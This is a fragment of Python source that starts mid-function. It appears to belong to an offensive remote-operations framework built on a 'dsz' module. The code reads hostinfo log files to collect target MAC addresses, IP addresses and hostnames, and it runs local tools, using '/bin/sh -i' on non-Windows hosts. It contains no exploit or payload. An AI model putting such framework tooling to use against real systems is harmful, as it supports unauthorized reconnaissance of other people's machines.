        files = glob.glob('%s/hostinfo_*.txt' % dsz.lp.GetLogsDirectory())
        if len(files) == 0:
            dsz.ui.Echo('* Failed to get host information', dsz.ERROR)
            if not dsz.ui.Prompt('Try again?'):
                return False

    try:
        f = open(files[len(files) - 1], 'r')
        try:
            lines = f.readlines()
        finally:
            f.close()

    except:
        dsz.ui.Echo('* Failed to read %s' % files[len(files) - 1], dsz.ERROR)
        return False

    for line in lines:
        if not _checkForHostInfo('MAC', line, extraInfo):
            if not _checkForHostInfo('ip', line, extraInfo):
                _checkForHostInfo('hostname', line, extraInfo)

    return True


def _checkForHostInfo(subexpr, line, extraInfo):
    match = re.match(subexpr + '=(.*)', line)
    if match != None:
        if not extraInfo.has_key(subexpr.lower()):
            extraInfo[subexpr.lower()] = list()
        extraInfo[subexpr.lower()].append(match.group(1))
    return match != None


def _runTool(toolLoc, args):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if dsz.version.checks.IsWindows(dsz.script.Env['local_address']):
        return dsz.cmd.Run('local run -command "%s %s" -redirect -noinput' % (toolLoc, args))
    else:
        return dsz.cmd.Run('local run -command "/bin/sh -i" -redirect "%s %s; exit" -noinput' % (toolLoc, args))